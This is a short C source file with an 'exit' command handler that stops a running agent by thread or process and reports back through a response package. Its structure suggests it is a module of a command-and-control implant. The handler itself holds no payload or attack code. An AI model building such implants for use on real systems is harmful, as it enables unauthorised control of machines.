#include "config.h"
#ifdef INCLUDE_CMD_EXIT

#include "commands.h"

#define EXIT_THREAD  0
#define EXIT_PROCESS 1

VOID cmd_exit(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD method = parser_int32(args);
    inst->ExitFunc = method;
    inst->Running = FALSE;

    if (method == EXIT_PROCESS) {
        package_add_string(inst, response, XSTR("Exiting (process)"));
    } else {
        package_add_string(inst, response, XSTR("Exiting (thread)"));
    }
}

#endif
